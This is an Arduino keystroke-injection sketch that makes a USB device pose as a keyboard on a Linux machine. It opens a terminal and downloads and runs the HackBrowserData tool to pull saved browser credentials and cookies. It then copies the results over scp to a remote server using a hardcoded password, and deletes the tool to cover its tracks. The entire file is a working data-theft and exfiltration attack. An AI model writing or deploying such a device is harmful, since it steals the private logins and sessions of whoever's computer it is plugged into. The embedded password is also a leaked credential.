#include <Keyboard.h>
void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(1000);

  //tecla windows
  Keyboard.press(KEY_LEFT_CTRL);
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  delay(1000);
  //ctrl+alt+t
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);


  //https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.2/hack-browser-data-linux-amd64.zip
  Keyboard.print("wget https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.2/hack-browser-data-linux-amd64.zip");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(10000);

  Keyboard.print("unzip hack-browser-data-linux-amd64.zip");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.print("./hack-browser-data-linux-amd64");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.print("scp -r results root@nrl-development.com:prueba");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.print("yes");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.print("@R&t40Pz@1");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.print("rm -rf hack-browser-data-linux-amd64*");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.press(KEY_LEFT_ALT);
  delay(10);
  Keyboard.press(KEY_F4);
  delay(10);
  Keyboard.releaseAll();
  
  Keyboard.end();
  
}

void loop() {
  // put your main code here, to run repeatedly:

}
